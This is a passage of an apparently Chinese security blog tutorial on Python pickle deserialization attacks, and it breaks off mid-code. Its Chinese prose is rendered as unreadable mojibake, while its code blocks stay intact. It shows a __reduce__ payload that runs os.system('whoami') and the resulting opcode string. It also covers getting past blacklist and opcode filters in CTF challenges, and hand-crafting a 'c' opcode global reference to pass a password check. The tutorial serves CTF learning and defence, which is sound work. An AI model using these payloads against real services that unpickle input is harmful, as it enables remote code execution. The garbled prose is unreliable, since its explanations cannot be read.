<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-variable language_">self</span>.a = os.system(<span class="hljs-string">&quot;whoami&quot;</span>)<br><br>test = Test()<br><br>serialized = pickle.dumps(test, protocol=<span class="hljs-number">0</span>)<br><span class="hljs-built_in">print</span>(serialized)<br></code></pre></td></tr></table></figure></p>
<p><code>os.system("whoami")</code> Âú® <code>test = Test()</code> Â∞±‰ºöË¢´ÊâßË°åÂÆåÊØïÔºåÊâÄ‰ª•Ëøô‰∏™ÂèØ‰ª•ËØ¥ÊòØËá™Â∑±Êó•Ëá™Â∑±‰∫Ü„ÄÇ</p>
<h4 id="Áõ∏ÂÖ≥È≠îÊúØÊñπÊ≥ï">Áõ∏ÂÖ≥È≠îÊúØÊñπÊ≥ï</h4>
<p>‰∏äÈù¢ÊèêÂà∞ËøáÔºåËß£Â∞ÅÁöÑÊó∂ÂÄôÊòØÊúâ‰∏Ä‰∏™ÈªòËÆ§ÁöÑËµãÂÄºËøáÁ®ãÔºåÊó¢ÁÑ∂ÊòØÈªòËÆ§Ë°å‰∏∫ÔºåÂæÄÂæÄÊòØÊúâÂäûÊ≥ïËá™ÂÆö‰πâÁöÑ„ÄÇPython Êèê‰æõ‰∫ÜÂæàÂ§öÈ≠îÊúØÊñπÊ≥ïÔºàÊØîÂ¶ÇÊØîËæÉÂ∏∏ËßÅÁöÑ <code>__reduce__</code>ÔºâÔºåÊù•ÊîπÂèòËøô‰∏ÄÈªòËÆ§Ë°å‰∏∫„ÄÇ‰∏ãÈù¢‰∏ÄËµ∑Êù•Áúã‰∏ãËøô‰∫õÈ≠îÊúØÊñπÊ≥ïÈÉΩÊòØÊÄé‰πàÁî®ÁöÑÔºà‰∏ãÈù¢Âá†‰∏™ÊñπÊ≥ïÁöÑ‰ªãÁªçÔºåÂÜÖÂÆπÂ§ßÈÉ®ÂàÜÈÉΩÊòØÊëòÂΩïËá™ÂÆòÊñπÊñáÊ°£Ôºâ„ÄÇ</p>
<h5 id="getnewargs_ex__">__getnewargs_ex__()</h5>
<p>ÈôêÂà∂Ôºö</p>
<ol type="1">
<li>ÂØπ‰∫é‰ΩøÁî® v2 ÁâàÊàñÊõ¥È´òÁâàÂçèËÆÆÁöÑ pickle ÊâçËÉΩ‰ΩøÁî®Ê≠§ÊñπÊ≥ï</li>
<li>ÂøÖÈ°ªËøîÂõû‰∏ÄÂØπ <code>(args, kwargs)</code> Áî®‰∫éÊûÑÂª∫ÂØπË±°ÔºåÂÖ∂‰∏≠ <code>args</code> ÊòØË°®Á§∫‰ΩçÁΩÆÂèÇÊï∞ÁöÑ tupleÔºåËÄå <code>kwargs</code> ÊòØË°®Á§∫ÂëΩÂêçÂèÇÊï∞ÁöÑ dict</li>
</ol>
<p><code>__getnewargs_ex__()</code> ÊñπÊ≥ï return ÁöÑÂÄºÔºå‰ºöÂú®Ëß£Â∞ÅÊó∂‰º†Áªô <code>__new__()</code> ÊñπÊ≥ïÁöÑ‰Ωú‰∏∫ÂÆÉÁöÑÂèÇÊï∞„ÄÇ</p>
<h5 id="getnewargs__">__getnewargs__()</h5>
<p>ÈôêÂà∂Ôºö</p>
<ol type="1">
<li>ÂøÖÈ°ªËøîÂõû‰∏Ä‰∏™ tuple Á±ªÂûãÁöÑ <code>args</code></li>
<li>Â¶ÇÊûúÂÆö‰πâ‰∫Ü <code>__getnewargs_ex__()</code>ÔºåÈÇ£‰πà <code>__getnewargs__()</code> Â∞±‰∏ç‰ºöË¢´Ë∞ÉÁî®„ÄÇ</li>
</ol>
<p>Ëøô‰∏™ÊñπÊ≥ï‰∏é‰∏ä‰∏Ä‰∏™ <code>__getnewargs_ex__()</code> ÊñπÊ≥ïÁ±ª‰ººÔºå‰ΩÜÂè™ÊîØÊåÅ‰ΩçÁΩÆÂèÇÊï∞„ÄÇ</p>
<p>Ê≥®ÔºöÂú® Python 3.6 ÂâçÔºåv2„ÄÅv3 ÁâàÂçèËÆÆ‰ºöË∞ÉÁî® <code>__getnewargs__()</code>ÔºåÊõ¥È´òÁâàÊú¨ÂçèËÆÆ‰ºöË∞ÉÁî® <code>__getnewargs_ex__()</code></p>
<h5 id="getstate__">__getstate__()</h5>
<p>Á±ªËøòÂèØ‰ª•Ëøõ‰∏ÄÊ≠•ÊéßÂà∂ÂÆû‰æãÁöÑÂ∞ÅÂ≠òËøáÁ®ã„ÄÇÂ¶ÇÊûúÁ±ªÂÆö‰πâ‰∫Ü <code>__getstate__()</code>ÔºåÂÆÉÂ∞±‰ºöË¢´Ë∞ÉÁî®ÔºåÂÖ∂ËøîÂõûÁöÑÂØπË±°ÊòØË¢´ÂΩìÂÅöÂÆû‰æãÂÜÖÂÆπÊù•Â∞ÅÂ≠òÁöÑÔºåÂê¶ÂàôÂ∞ÅÂ≠òÁöÑÊòØÂÆû‰æãÁöÑ <code>__dict__</code>„ÄÇÂ¶ÇÊûú <code>__getstate__()</code> Êú™ÂÆö‰πâÔºåÂÆû‰æãÁöÑ <code>__dict__</code> ‰ºöË¢´ÁÖßÂ∏∏Â∞ÅÂ≠ò„ÄÇ</p>
<h5 id="setstate__">__setstate__()</h5>
<p>ÂΩìËß£Â∞ÅÊó∂ÔºåÂ¶ÇÊûúÁ±ªÂÆö‰πâ‰∫Ü <code>__setstate__()</code>ÔºåÂ∞±‰ºöÂú®Â∑≤Ëß£Â∞ÅÁä∂ÊÄÅ‰∏ãË∞ÉÁî®ÂÆÉ„ÄÇÊ≠§Êó∂‰∏çË¶ÅÊ±ÇÂÆû‰æãÁöÑ state ÂØπË±°ÂøÖÈ°ªÊòØ dict„ÄÇÊ≤°ÊúâÂÆö‰πâÊ≠§ÊñπÊ≥ïÁöÑËØùÔºåÂÖàÂâçÂ∞ÅÂ≠òÁöÑ state ÂØπË±°ÂøÖÈ°ªÊòØ dictÔºå‰∏îËØ• dict ÂÜÖÂÆπ‰ºöÂú®Ëß£Â∞ÅÊó∂ËµãÁªôÊñ∞ÂÆû‰æãÁöÑ <code>__dict__</code></p>
<p>Â¶ÇÊûú <code>__getstate__()</code> ËøîÂõû <code>False</code>ÔºåÈÇ£‰πàÂú®Ëß£Â∞ÅÊó∂Â∞±‰∏ç‰ºöË∞ÉÁî® <code>__setstate__()</code> ÊñπÊ≥ï„ÄÇ</p>
<p>ÊâÄ‰ª•ÂèØ‰ª•Ëøô‰πàÁêÜËß£Ôºåpickle Êó∂ÔºåPython ‰ºöÂ∞ÅÂ≠òËØ•ÂÆû‰æãÁöÑ <code>__getstate__</code> ÊñπÊ≥ïËøîÂõûÁªôÂÆÉÁöÑÂÄºÔºõunpickle Êó∂ÔºåPython Â∞Ü unpickle ÂêéÁöÑÂÄº‰Ωú‰∏∫ÂèÇÊï∞‰º†ÈÄíÁªôÂÆû‰æãÁöÑ <code>_setstate_()</code> ÊñπÊ≥ï„ÄÇËÄåÂú® <code>_setstate_()</code> ÊñπÊ≥ïÂÜÖÈÉ®ÔºåÊòØÊåâÁÖß‰∫ãÂÖàËá™ÂÆö‰πâÂ•ΩÁöÑÊµÅÁ®ãÊù•ÈáçÂª∫ÂÆû‰æã„ÄÇ</p>
<h5 id="reduce__">__reduce__()</h5>
<p>ÈôêÂà∂Ôºö</p>
<ol type="1">
<li><code>__reduce__</code> ÊñπÊ≥ïÊòØÊñ∞ÂºèÁ±ªÁâπÊúâÁöÑ</li>
</ol>
<p>opcode <code>R</code> ÂÖ∂ÂÆûÂ∞±ÊòØ <code>__reduce__()</code></p>
<p><code>__reduce__()</code> ÊñπÊ≥ï‰∏çÂ∏¶‰ªª‰ΩïÂèÇÊï∞ÔºåÂπ∂‰∏îÂ∫îËøîÂõûÂ≠óÁ¨¶‰∏≤ÊàñÊúÄÂ•ΩËøîÂõû‰∏Ä‰∏™ÂÖÉÁªÑÔºàËøîÂõûÁöÑÂØπË±°ÈÄöÂ∏∏Áß∞‰∏∫ ‚Äúreduce ÂÄº‚ÄùÔºâ„ÄÇ</p>
<p>Â¶ÇÊûúËøîÂõûÂ≠óÁ¨¶‰∏≤ÔºåËØ•Â≠óÁ¨¶‰∏≤‰ºöË¢´ÂΩìÂÅö‰∏Ä‰∏™ÂÖ®Â±ÄÂèòÈáèÁöÑÂêçÁß∞„ÄÇÂÆÉÂ∫îËØ•ÊòØÂØπË±°Áõ∏ÂØπ‰∫éÂÖ∂Ê®°ÂùóÁöÑÊú¨Âú∞ÂêçÁß∞Ôºåpickle Ê®°Âùó‰ºöÊêúÁ¥¢Ê®°ÂùóÂëΩÂêçÁ©∫Èó¥Êù•Á°ÆÂÆöÂØπË±°ÊâÄÂ±ûÁöÑÊ®°Âùó„ÄÇËøôÁßçË°å‰∏∫Â∏∏Âú®Âçï‰æãÊ®°Âºè‰ΩøÁî®„ÄÇ</p>
<p>Â¶ÇÊûúËøîÂõûÁöÑÊòØÂÖÉÁªÑÔºåÂàôÂ∫îÂΩìÂåÖÂê´ 2 Âà∞ 6 ‰∏™ÂÖÉÁ¥†ÔºåÂèØÈÄâÂÖÉÁ¥†ÂèØ‰ª•ÁúÅÁï•ÊàñËÆæÁΩÆ‰∏∫ None„ÄÇÊØè‰∏™ÂÖÉÁ¥†‰ª£Ë°®ÁöÑÊÑè‰πâÂ¶Ç‰∏ãÔºö</p>
<ol type="1">
<li>‰∏Ä‰∏™ÂèØË∞ÉÁî®ÂØπË±°ÔºåËØ•ÂØπË±°‰ºöÂú®ÂàõÂª∫ÂØπË±°ÁöÑÊúÄÂàùÁâàÊú¨Êó∂Ë∞ÉÁî®„ÄÇ</li>
<li>ÂèØË∞ÉÁî®ÂØπË±°ÁöÑÂèÇÊï∞ÔºåÊòØ‰∏Ä‰∏™ÂÖÉÁªÑ„ÄÇÂ¶ÇÊûúÂèØË∞ÉÁî®ÂØπË±°‰∏çÊé•ÂèóÂèÇÊï∞ÔºåÂøÖÈ°ªÊèê‰æõ‰∏Ä‰∏™Á©∫ÂÖÉÁªÑ„ÄÇ</li>
<li>ÂèØÈÄâÂÖÉÁ¥†ÔºåÁî®‰∫éË°®Á§∫ÂØπË±°ÁöÑÁä∂ÊÄÅÔºåÂ∞ÜË¢´‰º†ÁªôÂâçËø∞ÁöÑ <code>__setstate__()</code> ÊñπÊ≥ï„ÄÇÂ¶ÇÊûúÂØπË±°Ê≤°ÊúâÊ≠§ÊñπÊ≥ïÔºåÂàôËøô‰∏™ÂÖÉÁ¥†ÂøÖÈ°ªÊòØÂ≠óÂÖ∏Á±ªÂûãÔºåÂπ∂‰ºöË¢´Ê∑ªÂä†Ëá≥ <code>__dict__</code> Â±ûÊÄß‰∏≠„ÄÇ</li>
<li>ÂèØÈÄâÂÖÉÁ¥†Ôºå‰∏Ä‰∏™ËøîÂõûËøûÁª≠È°πÁöÑËø≠‰ª£Âô®ÔºàËÄå‰∏çÊòØÂ∫èÂàóÔºâ„ÄÇËøô‰∫õÈ°π‰ºöË¢´ <code>obj.append(item)</code> ÈÄê‰∏™Âä†ÂÖ•ÂØπË±°ÔºåÊàñË¢´ <code>obj.extend(list_of_items)</code> ÊâπÈáèÂä†ÂÖ•ÂØπË±°„ÄÇËøô‰∏™ÂÖÉÁ¥†‰∏ªË¶ÅÁî®‰∫é list ÁöÑÂ≠êÁ±ªÔºå‰πüÂèØ‰ª•Áî®‰∫éÈÇ£‰∫õÊ≠£Á°ÆÂÆûÁé∞‰∫Ü <code>append()</code> Âíå <code>extend()</code> ÊñπÊ≥ïÁöÑÁ±ª„ÄÇÔºàÂÖ∑‰ΩìÊòØ‰ΩøÁî® <code>append()</code> ËøòÊòØ <code>extend()</code> ÂèñÂÜ≥‰∫é pickle ÂçèËÆÆÁâàÊú¨‰ª•ÂèäÂæÖÊèíÂÖ•ÂÖÉÁ¥†ÁöÑÈ°πÊï∞ÔºåÊâÄ‰ª•Ëøô‰∏§‰∏™ÊñπÊ≥ïÂøÖÈ°ªÂêåÊó∂Ë¢´Á±ªÊîØÊåÅÔºâ</li>
<li>ÂèØÈÄâÂÖÉÁ¥†Ôºå‰∏Ä‰∏™ËøîÂõûËøûÁª≠ÈîÆÂÄºÂØπÁöÑËø≠‰ª£Âô®ÔºàËÄå‰∏çÊòØÂ∫èÂàóÔºâ„ÄÇËøô‰∫õÈîÆÂÄºÂØπÂ∞Ü‰ºö‰ª• <code>obj[key] = value</code> ÁöÑÊñπÂºèÂ≠òÂÇ®‰∫éÂØπË±°‰∏≠„ÄÇËØ•ÂÖÉÁ¥†‰∏ªË¶ÅÁî®‰∫é dict Â≠êÁ±ªÔºå‰πüÂèØ‰ª•Áî®‰∫éÈÇ£‰∫õÂÆûÁé∞‰∫Ü <code>__setitem__()</code> ÁöÑÁ±ª„ÄÇ</li>
<li>ÂèØÈÄâÂÖÉÁ¥†Ôºå‰∏Ä‰∏™Â∏¶Êúâ <code>(obj, state)</code> Á≠æÂêçÁöÑÂèØË∞ÉÁî®ÂØπË±°„ÄÇËØ•ÂèØË∞ÉÁî®ÂØπË±°ÂÖÅËÆ∏Áî®Êà∑‰ª•ÁºñÁ®ãÊñπÂºèÊéßÂà∂ÁâπÂÆöÂØπË±°ÁöÑÁä∂ÊÄÅÊõ¥Êñ∞Ë°å‰∏∫ÔºåËÄå‰∏çÊòØ‰ΩøÁî® obj ÁöÑÈùôÊÄÅ <code>__setstate__()</code> ÊñπÊ≥ï„ÄÇÂ¶ÇÊûúÊ≠§Â§Ñ‰∏çÊòØ NoneÔºåÂàôÊ≠§ÂèØË∞ÉÁî®ÂØπË±°ÁöÑ‰ºòÂÖàÁ∫ßÈ´ò‰∫é obj ÁöÑ <code>__setstate__()</code>„ÄÇ</li>
</ol>
<p>3.8 Êñ∞ÁâàÂäüËÉΩ: Êñ∞Â¢û‰∫ÜÂÖÉÁªÑÁöÑÁ¨¨ 6 È°πÔºåÂèØÈÄâÂÖÉÁ¥† <code>(obj, state)</code></p>
<p>ÂèØ‰ª•ÁúãÂá∫ÔºåÂÖ∂ÂÆû pickle Âπ∂‰∏çÁõ¥Êé•Ë∞ÉÁî®‰∏äÈù¢ÁöÑÂá†‰∏™ÂáΩÊï∞„ÄÇ‰∫ãÂÆû‰∏äÔºåÂÆÉ‰ª¨ÂÆûÁé∞‰∫Ü <code>__reduce__()</code> Ëøô‰∏ÄÁâπÊÆäÊñπÊ≥ï„ÄÇÂ∞ΩÁÆ°Ëøô‰∏™ÊñπÊ≥ïÂäüËÉΩÂæàÂº∫Ôºå‰ΩÜÊòØÁõ¥Êé•Âú®Á±ª‰∏≠ÂÆûÁé∞ <code>__reduce__()</code> ÂÆπÊòì‰∫ßÁîüÈîôËØØ„ÄÇÂõ†Ê≠§ÔºåËÆæËÆ°Á±ªÊó∂Â∫îÂΩìÂ∞ΩÂèØËÉΩÁöÑ‰ΩøÁî®È´òÁ∫ßÊé•Âè£ÔºàÊØîÂ¶Ç <code>__getnewargs_ex__()</code>„ÄÅ<code>__getstate__()</code> Âíå <code>__setstate__()</code>Ôºâ„ÄÇÂêéÈù¢‰ªçÁÑ∂ÂèØ‰ª•ÁúãÂà∞Áõ¥Êé•ÂÆûÁé∞ <code>__reduce__()</code> Êé•Âè£ÁöÑÁä∂ÂÜµÔºåÂèØËÉΩÂà´Êó†‰ªñÊ≥ïÔºåÂèØËÉΩ‰∏∫‰∫ÜËé∑ÂæóÊõ¥Â•ΩÁöÑÊÄßËÉΩÔºåÊàñËÄÖ‰∏§ËÄÖÁöÜÊúâ‰πã„ÄÇ</p>
<h5 id="reduce_ex__">__reduce_ex__()</h5>
<p>‰Ωú‰∏∫Êõø‰ª£ÈÄâÈ°πÔºå‰πüÂèØ‰ª•ÂÆûÁé∞ <code>__reduce_ex__()</code> ÊñπÊ≥ï„ÄÇÊ≠§ÊñπÊ≥ïÁöÑÂîØ‰∏Ä‰∏çÂêå‰πãÂ§ÑÂú®‰∫éÂÆÉÊé•Âèó‰∏Ä‰∏™Êï¥ÂûãÂèÇÊï∞Áî®‰∫éÊåáÂÆöÂçèËÆÆÁâàÊú¨„ÄÇÂ¶ÇÊûúÂÆö‰πâ‰∫ÜËøô‰∏™ÂáΩÊï∞ÔºåÂàô‰ºöË¶ÜÁõñ <code>__reduce__()</code> ÁöÑË°å‰∏∫„ÄÇÊ≠§Â§ñÔºå<code>__reduce__()</code> ÊñπÊ≥ï‰ºöËá™Âä®Êàê‰∏∫Êâ©Â±ïÁâàÊñπÊ≥ïÁöÑÂêå‰πâËØç„ÄÇËøô‰∏™ÂáΩÊï∞‰∏ªË¶ÅÁî®‰∫é‰∏∫‰ª•ÂâçÁöÑ Python ÁâàÊú¨Êèê‰æõÂêëÂêéÂÖºÂÆπÁöÑ reduce ÂÄº„ÄÇ</p>
<h4 id="Âà©Áî®-__reduce__-Ëá™Âä®ÁîüÊàê">Âà©Áî® __reduce__() Ëá™Âä®ÁîüÊàê</h4>
<p>ËøôÈáå‰∏æ‰∏Ä‰∏™ÁÆÄÂçïÁöÑÊâßË°åÂëΩ‰ª§ÁöÑ demo„ÄÇ</p>
<p>ÊòæÁÑ∂ÔºåÂú®‰∏äÈù¢ÈÇ£‰πàÂ§öÊñπÊ≥ï‰∏≠Ôºå<code>__reduce__()</code> ÊòØÊàë‰ª¨ÁöÑÈ¶ñÈÄâÊûÑÈÄ†ÊñπÊ°àÔºådemo Â¶Ç‰∏ãÔºö<br />
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (os.system, (<span class="hljs-string">&quot;whoami&quot;</span>, ))<br><br>test = Test()<br><br>serialized = pickle.dumps(test, protocol=<span class="hljs-number">0</span>)<br><span class="hljs-built_in">print</span>(serialized)<br><br></code></pre></td></tr></table></figure></p>
<p>ÁªìÊûúÔºö<code>b'cnt\nsystem\np0\n(Vwhoami\np1\ntp2\nRp3\n.'</code></p>
<p>ÂΩìÁÑ∂ÔºåÊñ∞ÂºèÁ±ªÊòØ 3.x ÊâçÊúâÁöÑ„ÄÇÂ¶ÇÊûúË¶ÅÂú® 2.xÔºà&gt;= 2.2Ôºå&lt; 2.2 Êó†Êñ∞ÂºèÁ±ªÔºâ‰ΩøÁî® <code>__reduce__</code> ÁöÑËØùÔºåÈúÄË¶ÅÊâãÂä®ÊòæÂºèÁªßÊâøÊñ∞ÂºèÁ±ªÔºåÊää <code>class Test</code> Êîπ‰∏∫ <code>class Test(object)</code> Âç≥ÂèØ„ÄÇ</p>
<p>Â¶ÇÊûúÊîªÂáªÁõÆÊ†áÂèØ‰ª•‰º†ÂÖ•‰ªªÊÑèÂ∫èÂàóÂåñÁªìÊûúÔºåÈÇ£‰πàËøô‰∏™ payload Áõ¥Êé•Â∞±ÂèØ‰ª•ÁîüÊïà„ÄÇËøôÁßçÊîªÂáªÊúÄ‰∏∫ÁÆÄÂçïÔºåÂú® CTF ‰∏≠ÔºåÊúâÂà©Áî®ÈªëÂêçÂçï ban Êéâ system Á≠âÁ≠âÂáΩÊï∞ÁöÑÈ¢òÁõÆÔºåÊÄùË∑ØÂ∞±ÊòØÂØªÊâæÈªëÂêçÂçïÁöÑÊºèÁΩë‰πãÈ±º„ÄÇ</p>
<h4 id="ÈÅøÂÖç‰ΩøÁî®ÁâπÂÆöÁöÑ-opcode">ÈÅøÂÖç‰ΩøÁî®ÁâπÂÆöÁöÑ opcode</h4>
<p>Â¶ÇÊûúÊîªÂáªÁõÆÊ†áÊúâÂØπ‰º†ÂÖ•ÁöÑÂ∫èÂàóÂåñÁªìÊûúÂÅöÈ´òÂç± opcode Âà§Êñ≠ÁöÑËØùÔºåÂèØ‰ª•Â∞ùËØïÁî®‰∏çÂêåÁâàÊú¨ÁöÑÂçèËÆÆÔºö</p>
<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/6109c631-07fe-4d16-bfbb-c415ddfc91f1.png!blog#width-zoom6" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/34f6ae5c-5293-4716-aa50-dc1a016a2e89.png!blog#width-zoom6" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
<p>ËøôÁßçÂ∑ÆÂºÇÊÄßÊàñËÆ∏ËÉΩËÆ©Êàë‰ª¨ÁªïËøá‰∏Ä‰∫õ if Âà§Êñ≠„ÄÇ‰∏çËøáÔºåËØ∏Â¶Ç <code>R</code> ËøôÁßçÊØîËæÉÂøÖÈúÄÁöÑ opcodeÔºå‰∏ÄËà¨ÊòØÂæàÈöæÁî®ÂÖ∂‰ªñ opcode Êù•Áõ¥Êé•‰ª£ÊõøÁöÑ„ÄÇ</p>
<h4 id="souse">souse</h4>
<p>‰∏∫‰∫ÜÊñπ‰æøÊûÑÈÄ† PayloadÔºåÊàëÂÜô‰∫Ü‰∏Ä‰∏™Ëá™Âä®ËΩ¨ÂåñÁöÑÂ∑•ÂÖ∑Ôºö<a target="_blank" rel="noopener" href="https://github.com/Macr0phag3/souse">souse</a>ÔºåÂèØ‰ª•Â∞Ü Python Ê∫êÁ†ÅÂΩ¢ÂºèÁöÑ exp ËΩ¨‰∏∫ opcode ÂΩ¢ÂºèÁöÑ expÔºåÂèØÂÜ≤ÔºÅ</p>
<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/help.png!blog#width-zoom6" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
<p>‰∏çËøáÔºåÂú®Áî®Â∑•ÂÖ∑‰πãÂâç‰∏ÄÂÆöË¶ÅÂÖàÁúã‰∏ãÂ¶Ç‰ΩïÊ†πÊçÆÂà©Áî®ÈìæÊâãÊêì opcodeÔºåÊØïÁ´üÂ∑•ÂÖ∑Âè™ÊòØÂ∑•ÂÖ∑ËÄåÂ∑≤„ÄÇ</p>
<p>ÁΩë‰∏ä‰πüÊúâÂè¶‰∏Ä‰∏™Ëá™Âä®ÊûÑÈÄ†Â∑•ÂÖ∑ÔºåËßÅËµÑÊñô 4„ÄÇ</p>
<h3 id="ÊâãÂä®ÊûÑÈÄ†">ÊâãÂä®ÊûÑÈÄ†</h3>
<p>ÊâãÂä®ÊûÑÈÄ†ÈúÄË¶ÅÂØπ opcode ÊØîËæÉ‰∫ÜËß£ÔºàÂÆûÈôÖ‰∏äÁî®Âá†Ê¨°Â∞±ÁÜüÁªÉ‰∫ÜÔºâ„ÄÇÁî±‰∫éËá™Âä®ÊûÑÈÄ†ÁöÑÊâãÊ≥ïÊâãÂä®ÊûÑÈÄ†ÈÉΩÂèØ‰ª•ÂÅöÂà∞ÔºåÊâÄ‰ª•‰∏∫‰∫ÜÈÅøÂÖçÂÜÖÂÆπÈáçÂ§çÔºåËøôÈáåÂè™Âàó‰∏æÊâãÂä®ÊûÑÈÄ†ÁâπÊúâÊîªÂáªÁöÑÊâãÊ≥ï„ÄÇ</p>
<h4 id="ÂÖ®Â±ÄÂºïÁî®">ÂÖ®Â±ÄÂºïÁî®</h4>
<p>‰∏æ‰∏™‰æãÂ≠êÔºö<br />
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> secret<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Target</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        obj = pickle.loads(ser)  <span class="hljs-comment"># ËæìÂÖ•ÁÇπ</span><br>        <span class="hljs-keyword">if</span> obj.pwd == secret.pwd:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Hello, admin!&quot;</span>)<br></code></pre></td></tr></table></figure></p>
<p>Âú®Ëøô‰∏™‰æãÂ≠ê‰∏≠ÔºåÂÅáÂ¶ÇÊàëÂ∞±ÊòØÊÉ≥ÈÄöËøáËøô‰∏™ if Êù•ÂÆåÊàêÊîªÂáªÔºåÂ∫îËØ•ÊÄé‰πàÂÆûÁé∞Âë¢Ôºü</p>
<p>ÂÖàÁúãËá™Âä®ÊûÑÈÄ†ÔºåÊØîËæÉÁõ¥Êé•ÁöÑÊÄùË∑ØÂ∞±ÊòØÔºö<br />
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">secret</span>:<br>    pwd = <span class="hljs-string">&quot;???&quot;</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Target</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-variable language_">self</span>.pwd = secret.pwd<br><br>test = Target()<br><br>serialized = pickletools.optimize(pickle.dumps(test, protocol=<span class="hljs-number">0</span>))<br><span class="hljs-built_in">print</span>(serialized)<br><span class="hljs-comment"># ÁªìÊûú</span><br><span class="hljs-comment"># b&#x27;ccopy_reg\n_reconstructor\n(c__main__\nTarget\nc__builtin__\nobject\nNtR(dVpwd\nV???\nsb.&#x27;</span><br></code></pre></td></tr></table></figure></p>
<p>Ëøô‰∏™ÁäØ‰∫ÜÂíå‰∏äÈù¢ÈÇ£‰∏™ÂëΩ‰ª§ÊâßË°åÁõ∏ÂêåÁöÑÈîôËØØÔºåÂú®ÂÆû‰æãÂåñ Target ÁöÑÊó∂ÂÄôÔºå<code>self.pwd</code> Â∞±Â∑≤ÁªèË¢´ËµãÂÄºÂÆåÊàê‰∫ÜÔºåËÄåËøôËÇØÂÆöÊòØÊúâÈóÆÈ¢òÁöÑÔºåÂõ†‰∏∫‰Ω†‰∏çÁü•ÈÅì <code>secret.pwd</code> Âà∞Â∫ïÊòØÂï•ÔºàËøôÈáåÂä†‰∏™ <code>class secret</code> Âè™ÊòØ‰∏∫‰∫Ü‰ª£Á†ÅÂèØ‰ª•ËøêË°åÔºâ„ÄÇ</p>
<p>Ëøô‰∏™Êó∂ÂÄôÔºåÊàë‰ª¨ÂèØ‰ª•Âà©Áî® <code>c</code> Ëøô‰∏™ opcode Êù•ÂÆåÊàêÊîªÂáª„ÄÇ<code>c</code> ÂÖ∂ÂÆûÂ∞±ÊòØ <code>pickle.Unpickler().find_class(module, name)</code>„ÄÇ</p>
<p>ÂÆÉÁöÑ‰ΩúÁî®ÊòØÂØºÂÖ• module Ê®°ÂùóÂπ∂ËøîÂõûÂÖ∂‰∏≠ÂêçÂè´ <code>name</code> ÁöÑÂØπË±°ÔºåÂÖ∂‰∏≠ module Âíå name ÂèÇÊï∞ÈÉΩÊòØ str ÂØπË±°„ÄÇÊñáÊ°£ÊåáÂá∫Ôºå<code>find_class()</code> ÂêåÊ†∑ÂèØ‰ª•Áî®Êù•ÂØºÂÖ•ÂáΩÊï∞„ÄÇ</p>
<p>Êó¢ÁÑ∂Â¶ÇÊ≠§ÔºåÊàë‰ª¨Â∞±ÂèØ‰ª•ÊääÊîªÂáªÁõÆÊ†áÁ±ª‰∏≠ÂºïÁî®ÁöÑ <code>secret.pwd</code> Áî® <code>c</code> ÊãøËøõÊù•Ôºö<br />
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs rust"># ÂâçÂêéÂØπÊØî<br><span class="hljs-string">b&#x27;ccopy_reg<span class="hljs-char escape_">\n</span>_reconstructor<span class="hljs-char escape_">\n</span>(c__main__<span class="hljs-char escape_">\n</span>Target<span class="hljs-char escape_">\n</span>c__builtin__<span class="hljs-char escape_">\n</span>object<span class="hljs-char escape_">\n</span>NtR(dVpwd<span class="hljs-char escape_">\n</span>V???<span class="hljs-char escape_">\n</span>sb.&#x27;</span><br><br><span class="hljs-string">b&#x27;ccopy_reg<span class="hljs-char escape_">\n</span>_reconstructor<span class="hljs-char escape_">\n</span>(c__main__<span class="hljs-char escape_">\n</span>Target<span class="hljs-char escape_">\n</span>c__builtin__<span class="hljs-char escape_">\n</span>object<span class="hljs-char escape_">\n</span>NtR(dVpwd<span class="hljs-char 